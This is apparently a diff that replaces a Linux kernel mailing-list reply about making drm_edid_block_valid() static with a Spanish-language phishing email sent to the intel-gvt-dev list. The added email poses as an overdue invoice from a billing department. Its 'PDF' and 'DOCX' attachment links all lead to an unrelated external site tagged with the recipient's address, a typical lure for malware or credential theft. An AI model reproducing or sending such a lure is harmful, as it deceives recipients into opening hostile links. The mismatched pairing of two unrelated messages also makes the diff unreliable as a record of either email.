@@ -2,49 +2,33 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id 3D0F28D50D0
-	for <lists+intel-gvt-dev@lfdr.de>; Thu, 30 May 2024 19:17:14 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id D93098FD79E
+	for <lists+intel-gvt-dev@lfdr.de>; Wed,  5 Jun 2024 22:37:34 +0200 (CEST)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id EDAA41129CA;
-	Thu, 30 May 2024 17:17:12 +0000 (UTC)
-Authentication-Results: gabe.freedesktop.org;
-	dkim=pass (2048-bit key; unprotected) header.d=kernel.org header.i=@kernel.org header.b="mAeiNqSa";
-	dkim-atps=neutral
+	by gabe.freedesktop.org (Postfix) with ESMTP id A57C710E0A4;
+	Wed,  5 Jun 2024 20:37:33 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-Received: from dfw.source.kernel.org (dfw.source.kernel.org [139.178.84.217])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 409F61129CA;
- Thu, 30 May 2024 17:17:11 +0000 (UTC)
-Received: from smtp.kernel.org (transwarp.subspace.kernel.org [100.75.92.58])
- by dfw.source.kernel.org (Postfix) with ESMTP id 993E562886;
- Thu, 30 May 2024 17:17:10 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id A393EC2BBFC;
- Thu, 30 May 2024 17:17:08 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
- s=k20201202; t=1717089430;
- bh=iZR6IHmeSBh9bdyLMQRmhd+tC//9mar20EMaEAByleM=;
- h=Date:From:To:Cc:Subject:In-Reply-To:References:From;
- b=mAeiNqSaitwlpWJx2sMROMuiVppMSzVmQNnQscNcH6VAD15OKWh3S0t/nHo5zoIHt
- qI4TWmysJM/fqEjNgUDtujYaeoNFppY3o1vK8iqGo3obrS4Zqa+uTTlwUSmzRLiLx9
- X19po4tRjjqgkBjwJ15EzbuvS7EMCCxPED0AXb+1uOnwOPzlvYV5fAXFMPfw+qy3Ak
- oIjzWpLbzh73Ts1JsBwReCgKEs0AGZAflNTAnTIldga/avQZYuktbMFZGRuEiApKrL
- YI8xbY3Shm8tzTghbP3hOAbp3p1aPyYOaavBn/OVQ0Sa9fj25bBOWUblB+7N5JrbfG
- gzKm7P45D3UYA==
-Date: Thu, 30 May 2024 20:17:04 +0300
-From: Zhi Wang <zhiwang@kernel.org>
-To: Jani Nikula <jani.nikula@intel.com>
-Cc: intel-gfx@lists.freedesktop.org, Zhenyu Wang <zhenyuw@linux.intel.com>,
- Zhi Wang <zhi.wang.linux@gmail.com>, intel-gvt-dev@lists.freedesktop.org,
- dri-devel@lists.freedesktop.org
-Subject: Re: [PATCH 2/2] drm/edid: make drm_edid_block_valid() static
-Message-ID: <20240530201704.0000492c.zhiwang@kernel.org>
-In-Reply-To: <20240530124352.362736-2-jani.nikula@intel.com>
-References: <20240530124352.362736-1-jani.nikula@intel.com>
- <20240530124352.362736-2-jani.nikula@intel.com>
-X-Mailer: Claws Mail 4.1.1 (GTK 3.24.34; x86_64-w64-mingw32)
+X-Greylist: delayed 1835 seconds by postgrey-1.36 at gabe;
+ Wed, 05 Jun 2024 20:37:27 UTC
+Received: from vmi1316030.contaboserver.net (vmi1316030.contaboserver.net
+ [164.68.110.24])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id A693710E087
+ for <intel-gvt-dev@lists.freedesktop.org>;
+ Wed,  5 Jun 2024 20:37:27 +0000 (UTC)
+Received: by vmi1316030.contaboserver.net (Postfix, from userid 1000)
+ id 4B3481642A28; Wed,  5 Jun 2024 20:13:01 +0200 (CEST)
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: RE: intel-gvt-dev@lists.freedesktop.org ,
+ Notificacion de factura vencida MTA - 233001 - 059417.
+From: Yolanda Hidalgo Pastor - Facturacion
+ <Yolanda_HidalgoPastor21689@vmi1316030.contaboserver.net>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7bit
+Content-type: text/html; charset=iso-8859-1
+X-Mailer: PHP/7.4.33
+Message-Id: <20240605195153.4B3481642A28@vmi1316030.contaboserver.net>
+Date: Wed,  5 Jun 2024 20:13:01 +0200 (CEST)
+X-Spam: Yes
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -60,83 +44,51 @@ List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>,
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-On Thu, 30 May 2024 15:43:52 +0300
-Jani Nikula <jani.nikula@intel.com> wrote:
+<html>
 
-> drm_edid_block_valid() is no longer used outside of drm_edid.c. Make
-> it static.
-> 
-> Signed-off-by: Jani Nikula <jani.nikula@intel.com>
-> 
-> ---
-> 
-> Cc: Zhenyu Wang <zhenyuw@linux.intel.com>
-> Cc: Zhi Wang <zhi.wang.linux@gmail.com>
-> Cc: intel-gvt-dev@lists.freedesktop.org
-> Cc: intel-gfx@lists.freedesktop.org
-> Cc: dri-devel@lists.freedesktop.org
-> ---
->  drivers/gpu/drm/drm_edid.c | 17 ++++-------------
->  include/drm/drm_edid.h     |  2 --
->  2 files changed, 4 insertions(+), 15 deletions(-)
-> 
-> diff --git a/drivers/gpu/drm/drm_edid.c b/drivers/gpu/drm/drm_edid.c
-> index f68a41eeb1fa..13b3fd351b16 100644
-> --- a/drivers/gpu/drm/drm_edid.c
-> +++ b/drivers/gpu/drm/drm_edid.c
-> @@ -1966,22 +1966,14 @@ static void edid_block_dump(const char
-> *level, const void *block, int block_num) block, EDID_LENGTH, false);
->  }
->  
-> -/**
-> - * drm_edid_block_valid - Sanity check the EDID block (base or
-> extension)
-> - * @_block: pointer to raw EDID block
-> - * @block_num: type of block to validate (0 for base, extension
-> otherwise)
-> - * @print_bad_edid: if true, dump bad EDID blocks to the console
-> - * @edid_corrupt: if true, the header or checksum is invalid
-> - *
-> +/*
->   * Validate a base or extension EDID block and optionally dump bad
-> blocks to
->   * the console.
-> - *
-> - * Return: True if the block is valid, false otherwise.
->   */
-> -bool drm_edid_block_valid(u8 *_block, int block_num, bool
-> print_bad_edid,
-> -			  bool *edid_corrupt)
-> +static bool drm_edid_block_valid(void *_block, int block_num, bool
-> print_bad_edid,
-> +				 bool *edid_corrupt)
->  {
-> -	struct edid *block = (struct edid *)_block;
-> +	struct edid *block = _block;
->  	enum edid_block_status status;
->  	bool is_base_block = block_num == 0;
->  	bool valid;
-> @@ -2024,7 +2016,6 @@ bool drm_edid_block_valid(u8 *_block, int
-> block_num, bool print_bad_edid, 
->  	return valid;
->  }
-> -EXPORT_SYMBOL(drm_edid_block_valid);
->  
->  /**
->   * drm_edid_is_valid - sanity check EDID data
-> diff --git a/include/drm/drm_edid.h b/include/drm/drm_edid.h
-> index 6bdfa254a1c1..eaac5e665892 100644
-> --- a/include/drm/drm_edid.h
-> +++ b/include/drm/drm_edid.h
-> @@ -440,8 +440,6 @@ int drm_add_modes_noedid(struct drm_connector
-> *connector, int hdisplay, int vdisplay);
->  
->  int drm_edid_header_is_valid(const void *edid);
-> -bool drm_edid_block_valid(u8 *raw_edid, int block, bool
-> print_bad_edid,
-> -			  bool *edid_corrupt);
->  bool drm_edid_is_valid(struct edid *edid);
->  void drm_edid_get_monitor_name(const struct edid *edid, char *name,
->  			       int buflen);
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Factura</title>
+</head>
 
-Acked-by: Zhi Wang <zhiwang@kernel.rog>
+<body>
+
+<table cellpadding="0" cellspacing="0" width="548">
+	<!-- MSTableType="layout" -->
+	<tr>
+		<td height="565" valign="top"><a href="https://map.sewoon.org/1/themes/es/?cid=intel-gvt-dev@lists.freedesktop.org ">
+		<img border="0" src="https://i.imgur.com/tUv4TK3.png" width="267" height="56"><img border="0" src="https://i.imgur.com/kKIEIxE.png" width="271" height="59"></a><br>
+&nbsp;<hr>
+		<p><font face="Segoe UI" size="2">Factura MTA - 233001 - 059417 - intel-gvt-dev@lists.freedesktop.org .<br>
+		<br>
+		Tu factura ya esta disponible en formato PDF y DOC. Los hemos adjuntado 
+		al cuerpo de este correo. Tambien puedes descargarla haciendo clic en el 
+		siguiente boton.<br>
+		<br>
+		Tienes hasta el 10 de Junio de 2024 a las 15:00 p.m. para modificar tus 
+		datos de facturacion. Despues de esta fecha, no podras hacer ningun 
+		cambio.</font></p>
+		<ul>
+			<li><span style="letter-spacing: normal; background-color: #F7F7F8">
+			<font size="2">
+			<span style="font-family: Segoe UI">
+			<a href="https://map.sewoon.org/1/themes/es/?cid=intel-gvt-dev@lists.freedesktop.org "><span style="text-decoration: none">
+			FacturaMTA24482.pdf</span></a> (.pdf - Acrobat Reader)</span></font></span></li>
+			<li><span style="letter-spacing: normal; background-color: #F7F7F8">
+			<font size="2">
+			<span style="font-family: Segoe UI">
+			<a href="https://map.sewoon.org/1/themes/es/?cid=intel-gvt-dev@lists.freedesktop.org "><span style="text-decoration: none">FacturaMTA24482.docx</span></a>&nbsp; 
+			(.docx - Microsoft Word)</span></font></span></li>
+		</ul>
+		<p><font face="Segoe UI" size="2">Desde ya, muchas gracias.<br>
+		<br>
+		Atentamente,<br>
+		Yolanda Hidalgo Pastor<br>
+		Departamento de Facturacion<br>
+&nbsp;</font></td>
+	</tr>
+</table>
+
+</body>
+
+</html>
